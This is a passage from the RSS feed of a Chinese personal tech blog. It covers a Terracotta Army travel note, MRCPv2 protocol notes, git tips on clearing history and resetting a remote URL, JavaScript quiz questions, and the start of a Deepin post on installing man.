&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2022/12/xian-travel/2022-12-02-20-46-08.png&#34;&gt;
一号坑&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2022/12/xian-travel/2022-12-02-20-46-18.png&#34;&gt;
一号坑&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2022/12/xian-travel/2022-12-02-20-46-33.png&#34;&gt;
一号坑&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2022/12/xian-travel/2022-12-02-20-46-45.png&#34;&gt;
一号坑&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2022/12/xian-travel/2022-12-02-20-47-01.png&#34;&gt;
一号坑&lt;/p&gt;
&lt;p&gt;兵马俑有三个坑。&lt;/p&gt;
&lt;p&gt;一号坑最大，兵马俑也是最多的。然而当时游客比肩接踵，加上天气炎热，大家都在里面像蒸桑拿一样。&lt;/p&gt;
&lt;p&gt;出了一号坑，我心里想：这么大个坑，这么热为啥不装空调，难道是因为要保护文物吗？&lt;/p&gt;
&lt;p&gt;后来据博物馆的讲解员介绍：不装空调是因为审核手续复杂，可能要要个几十年手续才能完成。像二号坑和三号坑都已经装好空调了。&lt;/p&gt;
&lt;p&gt;二号坑真的是个坑，没有兵马俑，仅仅是个大坑。&lt;/p&gt;</description>
    </item>
    <item>
      <title>MRCPv2 协议学习</title>
      <link>https://wdd.js.org/posts/2022/12/mrcp-notes/</link>
      <pubDate>Thu, 01 Dec 2022 10:08:38 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2022/12/mrcp-notes/</guid>
      <description>&lt;h1 id=&#34;简介&#34;&gt;简介&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;MRCPv2 是&lt;code&gt;Media Resource Control Protocol Version 2&lt;/code&gt;的缩写&lt;/li&gt;
&lt;li&gt;MRCP 允许客户端去操作服务端的媒体资源处理&lt;/li&gt;
&lt;li&gt;MRCP 的常见功能如下
&lt;ul&gt;
&lt;li&gt;文本转语音&lt;/li&gt;
&lt;li&gt;语音识别&lt;/li&gt;
&lt;li&gt;说话人识别&lt;/li&gt;
&lt;li&gt;语音认证&lt;/li&gt;
&lt;li&gt;等等&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;MRCP 并不是一个独立的协议，而是依赖于其他的协议，如 SIP/SDP&lt;/li&gt;
&lt;li&gt;MRCPv2 RFC 发表于 2012 年&lt;/li&gt;
&lt;li&gt;MRCPv2 主要由思科,Nuance,Speechworks 开发&lt;/li&gt;
&lt;li&gt;MRCPv2 是基于 MRCPv1 开发的&lt;/li&gt;
&lt;li&gt;MRCPv2 不兼容 MRCPv1&lt;/li&gt;
&lt;li&gt;MRCPv2 在传输层使用 TCP 或者 TLS&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;定义&#34;&gt;定义&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;媒体资源： An entity on the speech processing server that can be controlled through MRCPv2.&lt;/li&gt;
&lt;li&gt;MRCP 服务器： Aggregate of one or more &amp;ldquo;Media Resource&amp;rdquo; entities on a server, exposed through MRCPv2. Often, &amp;lsquo;server&amp;rsquo; in this document refers to an MRCP server.&lt;/li&gt;
&lt;li&gt;MRCP 客户端: An entity controlling one or more Media Resources through MRCPv2 (&amp;ldquo;Client&amp;rdquo; for short).&lt;/li&gt;
&lt;li&gt;DTMF: Dual-Tone Multi-Frequency; a method of transmitting key presses in-band, either as actual tones (Q.23 [Q.23]) or as named tone events (RFC 4733 [RFC4733]).&lt;/li&gt;
&lt;li&gt;Endpointing: The process of automatically detecting the beginning and end of speech in an audio stream. This is critical both for speech recognition and for automated recording as one would find in voice mail systems.&lt;/li&gt;
&lt;li&gt;Hotword Mode: A mode of speech recognition where a stream of utterances is evaluated for match against a small set of command words. This is generally employed either to trigger some action or to control the subsequent grammar to be used for further recognition.&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;架构&#34;&gt;架构&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;客户端使用SIP/SDP建立MRCP控制通道&lt;/li&gt;
&lt;li&gt;SIP使用SDP的offer/answer模型来描述MRCP通道的参数&lt;/li&gt;
&lt;li&gt;服务端在answer SDP中提供唯一的通道ID和服务端TCP端口号&lt;/li&gt;
&lt;li&gt;客户端可以开启一个新的TCP链接，多个MRCP通道也可以共享一个TCP链接&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2022/12/mrcp-notes/2022-12-01-11-49-00.png&#34;&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>清除所有GIT历史记录</title>
      <link>https://wdd.js.org/git/clean-all-history/</link>
      <pubDate>Thu, 01 Dec 2022 09:49:29 +0800</pubDate>
      <guid>https://wdd.js.org/git/clean-all-history/</guid>
      <description>&lt;p&gt;有些时候，git 仓库累积了太多无用的历史更改，导致 clone 文件过大。如果确定历史更改没有意义，可以采用下述方法清空历史，&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;先 clone 项目到本地目录 (以名为 mylearning 的仓库为例)&lt;/li&gt;
&lt;/ol&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;git clone git@gitee.com:badboycoming/mylearning.git
&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;进入 mylearning 仓库，拉一个分支，比如名为 latest_branch&lt;/li&gt;
&lt;/ol&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;git checkout --orphan latest_branch
&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;添加所有文件到上述分支 (Optional)&lt;/li&gt;
&lt;/ol&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt; git add -A
&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;4&#34;&gt;
&lt;li&gt;提交一次&lt;/li&gt;
&lt;/ol&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt; git commit -am &amp;#34;Initial commit.&amp;#34;
&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;5&#34;&gt;
&lt;li&gt;删除 master 分支&lt;/li&gt;
&lt;/ol&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;git branch -D master
&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;6&#34;&gt;
&lt;li&gt;更改当前分支为 master 分支&lt;/li&gt;
&lt;/ol&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;git branch -m master
&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;7&#34;&gt;
&lt;li&gt;将本地所有更改 push 到远程仓库&lt;/li&gt;
&lt;/ol&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;git push -f origin master
&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;8&#34;&gt;
&lt;li&gt;关联本地 master 到远程 master&lt;/li&gt;
&lt;/ol&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;git branch --set-upstream-to=origin/master
&lt;/code&gt;&lt;/pre&gt;</description>
    </item>
    <item>
      <title>GIT 重新设置远程url</title>
      <link>https://wdd.js.org/git/remote-url/</link>
      <pubDate>Thu, 01 Dec 2022 09:46:13 +0800</pubDate>
      <guid>https://wdd.js.org/git/remote-url/</guid>
      <description>&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;git remote set-url origin repo-url
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    <item>
      <title>JS 考题</title>
      <link>https://wdd.js.org/fe/js-questions/</link>
      <pubDate>Fri, 04 Nov 2022 08:42:15 +0800</pubDate>
      <guid>https://wdd.js.org/fe/js-questions/</guid>
      <description>&lt;h1 id=&#34;1-分析输出&#34;&gt;1. 分析输出&lt;/h1&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;setTimeout&lt;/span&gt;(() =&amp;gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;), &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;let&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;setTimeout&lt;/span&gt;(() =&amp;gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;), &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;2-分析输出&#34;&gt;2. 分析输出&lt;/h1&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;shape&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;radius&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;diameter&lt;/span&gt;() {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;radius&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    },
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;perimeter&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; () =&amp;gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; Math.&lt;span style=&#34;color:#a6e22e&#34;&gt;PI&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;radius&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;shape&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;diameter&lt;/span&gt;()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;shape&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;perimeter&lt;/span&gt;()
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;3-分析输出&#34;&gt;3. 分析输出&lt;/h1&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;a&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;test1&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;a&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;a&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;wdd&amp;#39;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;test2&lt;/span&gt;() {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;test1&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;a&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;test3&lt;/span&gt;() {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;a&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;test2&lt;/span&gt;()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;test3&lt;/span&gt;()
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;4-分析输出&#34;&gt;4. 分析输出&lt;/h1&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Chameleon&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;colorChange&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;newColor&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;newColor&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;newColor&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;newColor&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;constructor&lt;/span&gt;({ &lt;span style=&#34;color:#a6e22e&#34;&gt;newColor&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;green&amp;#39;&lt;/span&gt; } &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {}) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;newColor&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;newColor&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;freddie&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Chameleon&lt;/span&gt;({ &lt;span style=&#34;color:#a6e22e&#34;&gt;newColor&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;purple&amp;#39;&lt;/span&gt; })
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;freddie&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;colorChange&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;orange&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;5-分析输出&#34;&gt;5. 分析输出&lt;/h1&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Person&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;firstName&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;lastName&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;firstName&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;firstName&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;lastName&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;lastName&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;member&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Person&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Lydia&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Hallie&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Person&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;getFullName&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; () {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;${&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;firstName&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;${&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;lastName&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;member&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;getFullName&lt;/span&gt;())
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;6-事件传播的三个阶段是什么&#34;&gt;6. 事件传播的三个阶段是什么？&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;A: Target &amp;gt; Capturing &amp;gt; Bubbling&lt;/li&gt;
&lt;li&gt;B: Bubbling &amp;gt; Target &amp;gt; Capturing&lt;/li&gt;
&lt;li&gt;C: Target &amp;gt; Bubbling &amp;gt; Capturing&lt;/li&gt;
&lt;li&gt;D: Capturing &amp;gt; Target &amp;gt; Bubbling&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;7-所有对象都有原型&#34;&gt;7. 所有对象都有原型&lt;/h1&gt;
&lt;p&gt;A: 对
B: 错&lt;/p&gt;</description>
    </item>
    <item>
      <title>Deepin安装man命令</title>
      <link>https://wdd.js.org/posts/2022/11/deepin-install-man/</link>
      <pubDate>Thu, 03 Nov 2022 11:55:51 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2022/11/deepin-install-man/</guid>
      <description>&lt;p&gt;想查资料，发现 deepin 居然没有 man 这个命令。&lt;/p&gt;
&lt;h1 id=&#34;安装&#34;&gt;安装&lt;/h1&gt;
